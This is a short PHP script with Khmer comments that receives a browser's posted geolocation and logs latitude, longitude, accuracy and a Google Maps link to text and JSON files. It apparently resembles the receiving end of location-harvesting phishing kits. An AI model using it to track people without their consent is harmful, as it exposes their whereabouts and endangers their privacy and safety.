<?php
// រក្សាទុកទិន្នន័យទីតាំងតែម្ដង
$date = date('dMYHis');
$locationData = $_POST['location'];
$directory = 'locations/';

if (!file_exists($directory)) {
    mkdir($directory, 0777, true);
}

if (!empty($_POST['location'])) {
    error_log("Location received" . "\r\n", 3, "location_log.log");
    
    // បំបែកទិន្នន័យ JSON
    $location = json_decode($locationData, true);
    
    if ($location) {
        $lat = $location['lat'];
        $lng = $location['lng'];
        $accuracy = $location['accuracy'];
        $timestamp = $location['timestamp'];
        
        // បង្កើត Google Maps Link
        $mapLink = "https://www.google.com/maps?q={$lat},{$lng}";
        
        // រក្សាទុកក្នុង map.txt (តែម្ដង)
        $mapFile = 'map.txt';
        
        // សរសេរព័ត៌មានលម្អិត
        $mapEntry = "=== Location Captured: {$date} ===\n";
        $mapEntry .= "Latitude: {$lat}\n";
        $mapEntry .= "Longitude: {$lng}\n";
        $mapEntry .= "Accuracy: {$accuracy} meters\n";
        $mapEntry .= "Map Link: {$mapLink}\n";
        $mapEntry .= "Timestamp: {$timestamp}\n";
        $mapEntry .= str_repeat("=", 50) . "\n\n";
        
        // បន្ថែមទៅក្នុងឯកសារ (បើចង់តែមួយចុងក្រោយ ប្រើ file_put_contents ធម្មតា)
        file_put_contents($mapFile, $mapEntry, FILE_APPEND);
        
        // រក្សាទុកជា JSON សម្រាប់ប្រើក្រោយ
        $jsonFile = $directory . 'location_' . $date . '.json';
        file_put_contents($jsonFile, json_encode($location, JSON_PRETTY_PRINT));
        
        // ក៏រក្សាទុកតែ Link សុទ្ធក្នុងឯកសារដាច់ដោយឡែក (ងាយអាន)
        $linkOnlyFile = 'latest_map.txt';
        file_put_contents($linkOnlyFile, $mapLink);
        
        echo json_encode(['status' => 'success', 'map' => $mapLink]);
    }
}
?>